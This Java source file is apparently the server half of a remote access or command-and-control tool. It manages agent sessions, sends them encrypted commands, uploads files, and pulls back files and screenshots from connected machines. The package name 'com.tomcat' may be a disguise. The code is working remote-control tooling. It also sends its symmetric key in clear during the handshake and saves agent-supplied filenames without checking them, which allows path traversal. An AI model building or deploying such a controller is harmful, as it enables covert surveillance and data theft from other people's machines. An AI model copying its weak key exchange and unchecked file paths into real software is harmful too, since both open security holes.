package com.tomcat.core.server;

import com.google.gson.Gson;
import com.tomcat.core.crypto.SymmetricCrypto;
import com.tomcat.core.event.EventManager;
import com.tomcat.core.event.EventManager.EventType;
import com.tomcat.core.output.Logger;
import com.tomcat.core.session.Session;
import com.tomcat.core.session.SessionManager;
import com.tomcat.utils.ServerConfig;
import java.io.*;
import java.net.Socket;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.*;

public abstract class BaseServer {

    protected final String Host;
    protected final int Port;
    protected final ServerConfig Config;
    protected final SymmetricCrypto Crypto;
    protected final SessionManager Sessions;
    protected final EventManager Events;
    protected final ConcurrentHashMap<Integer, Object> CommandLocks;
    protected volatile boolean Running;

    protected static final byte[] EndMarker = "<END>".getBytes();
    protected static final byte[] MetaMarker = "<META>".getBytes();
    protected static final Gson GsonInstance = new Gson();

    public BaseServer(String Host, int Port, ServerConfig Config) {
        this.Host = Host;
        this.Port = Port;
        this.Config = Config;
        this.Crypto = new SymmetricCrypto();
        this.Sessions = new SessionManager();
        this.Events = new EventManager();
        this.CommandLocks = new ConcurrentHashMap<>();
        try {
            this.Crypto.GenerateKey();
        } catch (Exception E) {
            Logger.ErrorMsg("Failed to generate crypto key: " + E.getMessage());
        }
    }

    public abstract boolean[] StartServer();

    public abstract void StopServer();

    public abstract void AcceptConnections();

    public void AddEventListener(EventManager.EventListener Listener) {
        Events.AddListener(Listener);
    }

    protected Map<String, Object> DoHandshake(Socket ClientSocket) throws Exception {
        ClientSocket.setSoTimeout(Config.GetConnectionTimeout());
        OutputStream Out = ClientSocket.getOutputStream();
        Out.write(Crypto.GetKey());
        Out.write('\n');
        Out.flush();
        Thread.sleep(300);

        ByteArrayOutputStream Buf = new ByteArrayOutputStream();
        InputStream In = ClientSocket.getInputStream();
        long Deadline = System.currentTimeMillis() + Config.GetConnectionTimeout();
        while (System.currentTimeMillis() < Deadline) {
            if (In.available() > 0) {
                int B = In.read();
                if (B == -1) break;
                Buf.write(B);
                if (Buf.size() > 2) {
                    byte[] Raw = Buf.toByteArray();
                    if (Raw[Raw.length - 1] == '\n' || Raw[Raw.length - 1] == '}') {
                        String Json = Buf.toString("UTF-8").trim();
                        if (Json.startsWith("{")) {
                            try {
                                Map<String, Object> Info = GsonInstance.fromJson(Json, Map.class);
                                ClientSocket.setSoTimeout(0);
                                return Info;
                            } catch (Exception Ignored) {}
                        }
                    }
                }
            } else {
                Thread.sleep(50);
            }
        }

        String Json = Buf.toString("UTF-8").trim();
        if (Json.startsWith("{")) {
            Map<String, Object> Info = GsonInstance.fromJson(Json, Map.class);
            ClientSocket.setSoTimeout(0);
            return Info;
        }
        throw new IOException("Invalid agent info: " + Json);
    }

    protected void MonitorSession(int SessionId, Socket Sock) {
        Thread MonitorThread = new Thread(() -> {
            while (Running) {
                if (!Sessions.Exists(SessionId)) break;
                try {
                    Object Lock = CommandLocks.get(SessionId);
                    if (Lock != null) {
                        synchronized (Lock) {}
                    }
                    Sock.getInputStream().available();
                    int PeekByte = Sock.getInputStream().read();
                    if (PeekByte == -1) throw new IOException("Agent disconnected");
                    Thread.sleep(3000);
                } catch (Exception E) {
                    Events.Trigger(
                        EventType.AgentDisconnected,
                        EventManager.BuildData("ID", SessionId, "Reason", E.getMessage())
                    );
                    RemoveSession(SessionId);
                    break;
                }
            }
        });
        MonitorThread.setDaemon(true);
        MonitorThread.start();
    }

    public String[] ExecuteCommand(int SessionId, String Command) {
        Optional<Session> OptSession = Sessions.Get(SessionId);
        if (OptSession.isEmpty()) return new String[] { "false", "Session not found" };
        Session S = OptSession.get();
        String CmdLower = Command.trim().toLowerCase();
        boolean IsUpload = CmdLower.startsWith("upload");
        boolean IsDownload =
            CmdLower.startsWith("download") || CmdLower.startsWith("dl ") || CmdLower.startsWith("screenshot");
        try {
            if (IsUpload) return HandleUpload(S, Command);
            byte[] Encrypted = Crypto.Encrypt(Command.getBytes("UTF-8"));
            S.GetSocket().setSoTimeout(Config.GetCommandTimeout());
            OutputStream Out = S.GetSocket().getOutputStream();
            Out.write(Encrypted);
            Out.flush();
            if (IsDownload) return HandleDownload(S);
            byte[] Response = ReadResponse(S.GetSocket(), Config.GetCommandTimeout());
            if (Response == null) return new String[] { "false", "No response from agent" };
            String Decrypted = Crypto.DecryptString(Response);
            return new String[] { "true", Decrypted };
        } catch (Exception E) {
            RemoveSession(SessionId);
            return new String[] { "false", "Error: " + E.getMessage() };
        }
    }

    protected byte[] ReadResponse(Socket Sock, int TimeoutMs) throws IOException {
        Sock.setSoTimeout(TimeoutMs);
        ByteArrayOutputStream Buffer = new ByteArrayOutputStream();
        byte[] Tmp = new byte[Config.GetBufferSize()];
        long Start = System.currentTimeMillis();
        while (true) {
            int N;
            try {
                N = Sock.getInputStream().read(Tmp);
            } catch (java.net.SocketTimeoutException E) {
                if (Buffer.size() > 0) break;
                return null;
            }
            if (N == -1) break;
            Buffer.write(Tmp, 0, N);
            byte[] Current = Buffer.toByteArray();
            if (EndsWith(Current, EndMarker)) {
                return Arrays.copyOf(Current, Current.length - EndMarker.length);
            }
            if (System.currentTimeMillis() - Start > TimeoutMs) break;
        }
        return Buffer.size() > 0 ? Buffer.toByteArray() : null;
    }

    private String[] HandleUpload(Session S, String Command) {
        String[] Parts = Command.trim().split("\\s+", 3);
        if (Parts.length < 2) return new String[] { "false", "Usage: upload <local_path> [remote_path]" };
        String LocalPath = Parts[1];
        String RemotePath = Parts.length > 2 ? Parts[2] : "";
        if (!Files.exists(Paths.get(LocalPath))) return new String[] { "false", "Local file not found: " + LocalPath };
        try {
            String Filename = Paths.get(LocalPath).getFileName().toString();
            String AgentCmd = RemotePath.isEmpty() ? "upload " + Filename : "upload " + RemotePath;
            byte[] Encrypted = Crypto.Encrypt(AgentCmd.getBytes("UTF-8"));
            OutputStream Out = S.GetSocket().getOutputStream();
            Out.write(Encrypted);
            Out.flush();
            Thread.sleep(300);
            byte[] FileData = Files.readAllBytes(Paths.get(LocalPath));
            Map<String, Object> Meta = new HashMap<>();
            Meta.put("type", "file");
            Meta.put("filename", Filename);
            Meta.put("size", FileData.length);
            byte[] MetaJson = Crypto.Encrypt(GsonInstance.toJson(Meta).getBytes("UTF-8"));
            Out.write(MetaJson);
            Out.write(MetaMarker);
            Out.flush();
            Thread.sleep(100);
            Out.write(FileData);
            Out.write(EndMarker);
            Out.flush();
            return new String[] { "true", "File sent: " + Filename + " (" + FileData.length + " bytes)" };
        } catch (Exception E) {
            return new String[] { "false", "Upload error: " + E.getMessage() };
        }
    }

    private String[] HandleDownload(Session S) {
        try {
            ByteArrayOutputStream Buffer = new ByteArrayOutputStream();
            byte[] Tmp = new byte[Config.GetBufferSize()];
            S.GetSocket().setSoTimeout(30000);
            while (true) {
                int N;
                try {
                    N = S.GetSocket().getInputStream().read(Tmp);
                } catch (java.net.SocketTimeoutException E) {
                    break;
                }
                if (N == -1) break;
                Buffer.write(Tmp, 0, N);
                byte[] Current = Buffer.toByteArray();
                if (ContainsMarker(Current, MetaMarker) || EndsWith(Current, EndMarker)) break;
            }
            byte[] Data = Buffer.toByteArray();
            int MetaIdx = IndexOf(Data, MetaMarker);
            if (MetaIdx >= 0) {
                byte[] MetaRaw = Arrays.copyOf(Data, MetaIdx);
                byte[] Rest = Arrays.copyOfRange(Data, MetaIdx + MetaMarker.length, Data.length);
                String MetaJson = Crypto.DecryptString(MetaRaw);
                Map<String, Object> Meta = GsonInstance.fromJson(MetaJson, Map.class);
                String Filename = (String) Meta.getOrDefault("filename", "received_file");
                ByteArrayOutputStream FileBuffer = new ByteArrayOutputStream();
                FileBuffer.write(Rest);
                S.GetSocket().setSoTimeout(30000);
                while (!EndsWith(FileBuffer.toByteArray(), EndMarker)) {
                    int N;
                    try {
                        N = S.GetSocket().getInputStream().read(Tmp);
                    } catch (java.net.SocketTimeoutException E) {
                        break;
                    }
                    if (N == -1) break;
                    FileBuffer.write(Tmp, 0, N);
                }
                byte[] FileData = FileBuffer.toByteArray();
                if (EndsWith(FileData, EndMarker)) FileData = Arrays.copyOf(
                    FileData,
                    FileData.length - EndMarker.length
                );
                String SavePath = SaveFile(Filename, FileData, S.GetId());
                return SavePath != null
                    ? new String[] { "true", "File saved: " + SavePath }
                    : new String[] { "false", "Failed to save file" };
            }
            if (EndsWith(Data, EndMarker)) Data = Arrays.copyOf(Data, Data.length - EndMarker.length);
            String Decrypted = Crypto.DecryptString(Data);
            return new String[] { "true", Decrypted };
        } catch (Exception E) {
            return new String[] { "false", "Download error: " + E.getMessage() };
        }
    }

    protected String SaveFile(String Filename, byte[] Data, int SessionId) {
        try {
            Path Dir = Paths.get("Downloads/Session_" + SessionId);
            Files.createDirectories(Dir);
            String Base = Filename;
            String Ext = "";
            int Dot = Filename.lastIndexOf('.');
            if (Dot > 0) {
                Base = Filename.substring(0, Dot);
                Ext = Filename.substring(Dot);
            }
            Path Target = Dir.resolve(Filename);
            for (int I = 1; Files.exists(Target); I++) Target = Dir.resolve(Base + "_" + I + Ext);
            Files.write(Target, Data);
            return Target.toString();
        } catch (IOException E) {
            Logger.ErrorMsg("Failed to save file: " + E.getMessage());
            return null;
        }
    }

    public void RemoveSession(int SessionId) {
        Sessions.Remove(SessionId);
        CommandLocks.remove(SessionId);
        Events.Trigger(EventType.AgentRemoved, EventManager.BuildData("ID", SessionId));
    }

    public SessionManager GetSessions() {
        return Sessions;
    }

    public EventManager GetEvents() {
        return Events;
    }

    public SymmetricCrypto GetCrypto() {
        return Crypto;
    }

    public String GetHost() {
        return Host;
    }

    public int GetPort() {
        return Port;
    }

    public boolean IsRunning() {
        return Running;
    }

    protected boolean EndsWith(byte[] Data, byte[] Suffix) {
        if (Data.length < Suffix.length) return false;
        for (int I = 0; I < Suffix.length; I++) if (Data[Data.length - Suffix.length + I] != Suffix[I]) return false;
        return true;
    }

    protected boolean ContainsMarker(byte[] Data, byte[] Marker) {
        return IndexOf(Data, Marker) >= 0;
    }

    protected int IndexOf(byte[] Data, byte[] Pattern) {
        outer: for (int I = 0; I <= Data.length - Pattern.length; I++) {
            for (int J = 0; J < Pattern.length; J++) if (Data[I + J] != Pattern[J]) continue outer;
            return I;
        }
        return -1;
    }
}
